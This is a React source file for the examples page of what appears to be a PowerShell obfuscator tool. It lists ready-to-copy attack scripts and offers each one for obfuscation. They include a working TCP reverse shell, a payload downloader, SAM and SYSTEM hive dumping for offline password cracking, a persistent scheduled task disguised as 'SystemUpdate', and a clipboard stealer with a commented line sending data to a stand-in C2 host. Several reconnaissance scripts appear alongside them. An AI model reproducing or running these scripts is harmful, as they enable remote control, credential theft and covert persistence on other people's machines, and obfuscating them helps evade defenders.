// version 0.1.3 - Examples
import React, { useState } from 'react';

const exampleScripts = [
  {
    title: "PowerShell TCP Reverse Shell",
    description: "A standard and reliable reverse shell that connects to a listener, receives commands, executes them, and sends back the output.",
    code: `$tcpClient = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444);
$networkStream = $tcpClient.GetStream();
[byte[]]$buffer = New-Object byte[] 65536;
while(($bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $commandToExecute = ([System.Text.ASCIIEncoding]::new()).GetString($buffer, 0, $bytesRead);
    $commandOutput = (Invoke-Expression $commandToExecute 2>&1 | Out-String);
    $fullOutput = $commandOutput + 'PS ' + (Get-Location).Path + '> ';
    $outputBytes = ([System.Text.Encoding]::ASCII).GetBytes($fullOutput);
    $networkStream.Write($outputBytes, 0, $outputBytes.Length);
    $networkStream.Flush();
};
$tcpClient.Close();`
  },
  {
    title: "System Information Gatherer",
    description: "A basic script to collect and display key system information. A common starting point for reconnaissance payloads.",
    code: `Write-Host "Gathering system information..."
$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
$pcInfo = Get-CimInstance -ClassName Win32_ComputerSystem
$ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetConnectionProfile).InterfaceAlias).IPAddress

Write-Host "OS: $($osInfo.Caption)"
Write-Host "Hostname: $($pcInfo.Name)"
Write-Host "IP Address: $($ipAddress)"
Write-Host "Done."`
  },
  {
    title: "Simple File Downloader",
    description: "Downloads a file from a specified URL and saves it to a temporary location. Useful for staging additional tools.",
    code: `$url = "http://example.com/payload.exe"
$output = "$env:TEMP\\utility.exe"
Write-Host "Downloading from $url to $output..."
Invoke-WebRequest -Uri $url -OutFile $output
Write-Host "Download complete."
# To execute, you could add:
# Start-Process -FilePath $output`
  },
  {
    title: "Check for Admin Privileges",
    description: "A script that checks if the current user session is running with elevated (Administrator) privileges.",
    code: `$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Host "Running with Administrator privileges." -ForegroundColor Green
} else {
    Write-Host "Running with standard user privileges." -ForegroundColor Yellow
}`
  },
   {
    title: "List Running Processes",
    description: "Enumerates all running processes on the system, which can be used to check for security software or specific applications.",
    code: `Write-Host "Listing all running processes..."
Get-Process | Select-Object -Property ProcessName, Id, CPU, PM | Sort-Object -Property CPU -Descending | Format-Table
Write-Host "Process listing complete."`
  },
  {
    title: "SAM & SYSTEM Hive Backup",
    description: "Attempts to copy the SAM and SYSTEM registry hives for offline cracking. (Requires Administrator privileges).",
    code: `$samPath = "$env:TEMP\\sam.save"
$systemPath = "$env:TEMP\\system.save"
Write-Host "Attempting to save SAM and SYSTEM hives..."
reg.exe save hklm\\sam "$samPath"
reg.exe save hklm\\system "$systemPath"
Write-Host "SAM hive saved to: $samPath"
Write-Host "SYSTEM hive saved to: $systemPath"`
  },
  {
    title: "Persistent Scheduled Task",
    description: "Creates a scheduled task to run a payload upon user logon. (Requires Administrator privileges).",
    code: `$action = New-ScheduledTaskAction -Execute "C:\\Users\\Public\\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\\Administrators" -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "Critical system update service" -Principal $principal -Settings $settings -Force
Write-Host "Scheduled task 'SystemUpdate' created."`
  },
  {
    title: "Clipboard Content Stealer",
    description: "Retrieves the current content of the user's clipboard, which may contain sensitive information like passwords or keys.",
    code: `if (Get-Clipboard -Format Text) {
    $clipboardContent = Get-Clipboard
    Write-Host "Clipboard content captured:"
    Write-Host $clipboardContent
    # In a real attack, you would exfiltrate this data:
    # Invoke-WebRequest -Uri "http://your-c2.com/clipboard" -Method POST -Body $clipboardContent
} else {
    Write-Host "Clipboard is empty or contains no text."
}`
  },
  {
    title: "Basic Port Scanner",
    description: "Scans a target IP address for a list of common open TCP ports. Useful for network reconnaissance.",
    code: `$targetIP = "192.168.1.1"
$commonPorts = @(21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080)

Write-Host "Scanning $targetIP for open ports..."
foreach ($port in $commonPorts) {
    $connection = Test-NetConnection -ComputerName $targetIP -Port $port -InformationLevel Quiet
    if ($connection) {
        Write-Host "Port $port is open" -ForegroundColor Green
    }
}`
  },
  {
    title: "Enumerate Local Users",
    description: "Lists all local user accounts on the machine, providing insight into who has access to the system.",
    code: `Write-Host "Enumerating local user accounts..."
try {
    Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description | Format-Table
} catch {
    Write-Warning "Could not use Get-LocalUser. Trying 'net user'..."
    net user
}`
  },
  {
    title: "Find World-Writable Folders",
    description: "Searches for folders on C:\\ where 'Everyone' has write permissions. (Note: This can be slow on large drives).",
    code: `Write-Host "Searching for world-writable folders on C:\\. This may take a while..."
Get-ChildItem -Path C:\\ -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $acl = Get-Acl -Path $_.FullName
        foreach ($access in $acl.Access) {
            if ($access.IdentityReference -eq "Everyone" -and $access.FileSystemRights -match "Write") {
                Write-Host "Writable Folder Found: $($_.FullName)" -ForegroundColor Yellow
            }
        }
    } catch {
        # Ignore access denied errors
    }
}`
  }
];

const ExampleCard = ({ title, description, code, onLoad }: typeof exampleScripts[0] & { onLoad: (code: string) => void; }) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-brand-surface rounded-lg border border-brand-border shadow-lg flex flex-col">
      <div className="p-4 md:p-6">
        <h3 className="text-xl font-bold text-gray-100">{title}</h3>
        <p className="text-brand-text-light mt-2 text-sm">{description}</p>
      </div>
       <div className="bg-brand-bg relative group flex-grow">
          <pre className="p-4 text-sm overflow-x-auto h-full">
            <code className="font-mono text-green-300 whitespace-pre-wrap break-words">{code}</code>
          </pre>
      </div>
      <div className="bg-brand-surface border-t border-brand-border p-3 flex justify-end space-x-3">
        <button
          onClick={handleCopy}
          className="bg-brand-border text-brand-text-light px-3 py-1.5 text-xs rounded-md hover:bg-opacity-80 transition-all duration-200"
          aria-label="Copy code to clipboard"
        >
          {copied ? 'Copied!' : 'Copy Code'}
        </button>
        <button
          onClick={() => onLoad(code)}
          // --- CAMBIO PRINCIPAL AQUÍ ---
          className="bg-brand-secondary text-white px-3 py-1.5 text-xs rounded-md hover:opacity-90 transition-opacity"
          aria-label="Load in Obfuscator"
        >
          Load in Obfuscator
        </button>
      </div>
    </div>
  );
};

interface ExamplesProps {
    onLoadScript: (script: string) => void;
}

const Examples: React.FC<ExamplesProps> = ({ onLoadScript }) => {
  return (
    <div>
      <div className="text-center mb-12">
        <h2 className="text-3xl font-bold tracking-tight text-gray-100 sm:text-4xl">PowerShell Script Examples</h2>
        <p className="mt-4 text-lg leading-8 text-brand-text-light">
          Use these examples as a starting point for the Obfuscator or for learning common PowerShell patterns.
        </p>
      </div>
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {exampleScripts.map((example, index) => (
          <ExampleCard key={index} {...example} onLoad={onLoadScript} />
        ))}
      </div>
    </div>
  );
};

export default Examples;
